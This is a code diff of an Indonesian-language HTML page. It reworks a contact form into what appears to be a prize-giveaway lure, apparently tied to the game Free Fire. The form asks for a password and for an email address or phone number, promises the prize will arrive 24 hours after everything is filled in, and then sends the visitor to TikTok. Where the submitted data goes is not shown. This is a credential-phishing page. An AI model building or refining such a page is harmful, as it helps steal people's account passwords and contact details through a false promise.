@@ -161,23 +161,20 @@ button:hover{
 
 <div id="inputArea"></div>
       
-  
-    <input type="text" name="name" placeholder="Nama" required>
     <input type="text" name="Masukkan Password" placeholder="Password" required>
     <textarea name="message" rows="4" placeholder="Pesan" required></textarea>
-    <button type="submit" onclick="playSound()">Kirim Pesan</button>
+    <button type="submit" onclick="bukaFreeFire()">Submit</button>
+      <div class="format-box">
+    <b>NOTE:</b><br>
+    HADIAH SEGERA DIKIRIM 24JAM SETELAH MENGISI SEMUA
+      </div>
   </form>
 </div>
 
-<!-- Sound -->
-<audio id="clickSound">
-  <source src="https://www.soundjay.com/buttons/sounds/button-16.mp3" type="audio/mpeg">
-</audio>
-
 <script>
-function playSound(){
-  document.getElementById("clickSound").play();
-}
+function bukaFreeFire(){
+    window.location.href = "https://www.tiktok.com";
+  }
 
 /* Particle Effect */
 const canvas = document.getElementById("particles");
@@ -214,6 +211,28 @@ function animate(){
   requestAnimationFrame(animate);
 }
 animate();
+
+  function gantiInput() {
+    var metode = document.getElementById("metode").value;
+    var area = document.getElementById("inputArea");
+
+    if (metode === "email") {
+        area.innerHTML = `
+            <label>Masukkan email anda (@gmail.com)</label><br>
+            <input type="email" placeholder="contoh@gmail.com" required>
+        `;
+    } 
+    else if (metode === "nomor") {
+        area.innerHTML = `
+            <label>Masukkan nomor HP</label><br>
+            <input type="text" placeholder="08xxxxxxxxxx"
+            oninput="this.value=this.value.replace(/[^0-9]/g,'')" required>
+        `;
+    } 
+    else {
+        area.innerHTML = "";
+    }
+  }
 </script>
 
 </body>
